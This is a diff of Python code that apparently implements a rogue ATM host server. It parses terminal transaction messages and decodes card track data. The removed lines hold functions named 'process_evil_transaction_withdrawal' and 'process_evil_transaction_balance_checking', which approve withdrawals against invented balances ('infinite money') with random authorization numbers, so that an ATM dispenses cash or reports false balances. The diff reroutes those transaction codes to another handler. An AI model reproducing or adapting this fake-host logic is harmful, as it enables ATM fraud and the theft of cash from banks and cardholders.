@@ -226,29 +226,29 @@ try:
 				'62': 'Cash Withdrawal from primary savings account using Miscellaneous Field ID e in request message for amount.'
 			} 
 			self.transaction_table_calls = {
-				'11': self.process_evil_transaction_withdrawal,
-				'12': self.process_evil_transaction_withdrawal,
+				'11': self.pgen,
+				'12': self.pgen,
 				'15': self.pgen,
-				'21': self.process_evil_transaction_withdrawal,
-				'22': self.process_evil_transaction_withdrawal,
-				'25': self.process_invalid_message,
-				'29': self.process_reversal_message,
-				'31': self.process_evil_transaction_balance_checking,
-				'32': self.process_evil_transaction_balance_checking,
-				'35': self.process_invalid_message,
-				'41': self.process_invalid_message,
-				'42': self.process_invalid_message,
-				'43': self.process_invalid_message,
-				'44': self.process_invalid_message,
-				'45': self.process_invalid_message,
-				'46': self.process_invalid_message,
-				'47': self.process_invalid_message,
-				'48': self.process_invalid_message,
-				'49': self.process_invalid_message,
+				'21': self.pgen,
+				'22': self.pgen,
+				'25': self.pgen,
+				'29': self.pgen,
+				'31': self.pgen,
+				'32': self.pgen,
+				'35': self.pgen,
+				'41': self.pgen,
+				'42': self.pgen,
+				'43': self.pgen,
+				'44': self.pgen,
+				'45': self.pgen,
+				'46': self.pgen,
+				'47': self.pgen,
+				'48': self.pgen,
+				'49': self.pgen,
 				'50': self.process_host_totals,
 				'51': self.process_host_totals,
-				'52': self.process_invalid_message,
-				'53': self.process_invalid_message,
+				'52': self.pgen,
+				'53': self.pgen,
 				'60': self.process_download_request,
 				'61': self.pgen,
 				'62': self.pgen
@@ -321,79 +321,7 @@ try:
 			msg = termid + '\x1c' + str(tcode) + '\x1c' + bus_date + '\x1c' + '0'*4 + '0'*4 +'0'*4 + "00000005" + '\x1c' + '\x03'
 			nicePrint(msg,"Sending Host Total:")
 			return makeMessage(msg,True,True)
-
-		def process_evil_transaction_balance_checking(self,termid,msg,action):
-			# TODO: payment processing function from algorythm oncr addfed
-			a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
-			pprint(hdr)
-			pprint(body)
-			# process here
-			response_code = BCODE
-			authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
-			print(fee)
-			print(amount)
- 
-			currentbalance=randint(0,100000) # for some fun
-			track = decodeCard(body['track2'])
-			pprint(track)
-			currentbalance=BBALANCE
-			print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],currentbalance))
-			fee = BFEE
-
-			# API CALL
-			try:
-					balance = str(int(currentbalance)*100).replace("-","").zfill(8)
-					print("\n\nCurrent bank balance for %s is: $ %s translated to %s\n\n"%(str(track['primary_account_number']),str(currentbalance),str(balance)))
-			except Exception as e:
-					traceback.print_exc()
-					response_code = "034"
-			print("\n")
-			pprint("got response %s"%response_code)
-			print("\n\n\n")
-			# repeating stuff here... sadly
-			fee = str(fee).zfill(8)
-			multi_part_message = "0" # not set
-			trasac_date = time.strftime('%m%d%y')
-			trasac_time = time.strftime('%H%M%S')
-			bus_date = time.strftime('%m%d%y')
-			msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
-			nicePrint(msg,"Transaction PROCESS:")
-			return makeMessage(msg,True,True)
-
-		def process_evil_transaction_withdrawal(self,termid,msg,action):
-			# TODO: payment processing function from algorythm oncr addfed
-			a,amount,fee,hdr,body = self.process_transaction_message(termid,msg,action)
-			pprint(hdr)
-			pprint(body)
-
-			# !!!!! LOOK HERE !!!!!!
-			# set value of amount due to 0 and fee to 10, next set both to 0 and deduct
-			response_code = BCODE # 000 = success , 111 = failure
-			total_balance = BBALANCE # infinite money
-			track = decodeCard(body['track2'])
-			print("\n\nCustomer: %s (%s) has balance of %s"%(BPERSON,track['primary_account_number'],total_balance))
-			fee = BFEE # 5000 e.g. 50.00
-
-			authorization_number = str(''.join(["{}".format(randint(0, 9)) for num in range(0, 8)]))
-			try:
-					calculation = (int(total_balance)-((int(amount)*1)+int(fee)))
-					balance = str(calculation*100).replace("-","").zfill(8)
-					print("\n!!!Deducting (%s+%s) [%s] from %s to make %s\n"%(str(amount),str(fee),str((amount+fee)),str(total_balance),str(balance)))
-			except Exception as e:
-					traceback.print_exc()
-					response_code = "111" # 2424
-			# repeating stuff here... sadly
-			print("\n\n\n")
-			fee = str(fee*100).zfill(8)
-			total_balance=str(total_balance*100).zfill(8)
-			multi_part_message = "0" # not set
-			trasac_date = time.strftime('%m%d%y')
-			trasac_time = time.strftime('%H%M%S')
-			bus_date = time.strftime('%m%d%y')
-			msg = multi_part_message + '\x1c' + termid + '\x1c' + action + '\x1c' + body['sequence_number'] + "\x1c" + str(response_code) + "\x1c" + str(authorization_number) + "\x1c" + str(trasac_date) + "\x1c" + str(trasac_time) + "\x1c" + str(bus_date) + "\x1c" + balance + "\x1c" + fee + "\x1c" + "\x1c" + "\x03"
-			nicePrint(msg,"Transaction PROCESS SEND:")
-			return makeMessage(msg,True,True)
-
+			
 		def process_reversal_message(self,termid,msg,action):
 			# generic handler
 			hdr = self.parseHeader(msg)
@@ -599,4 +527,4 @@ except Exception as e:
 	traceback.print_exc()
 	if e is KeyboardInterrupt:
 		sys.exit(1)
-		
+
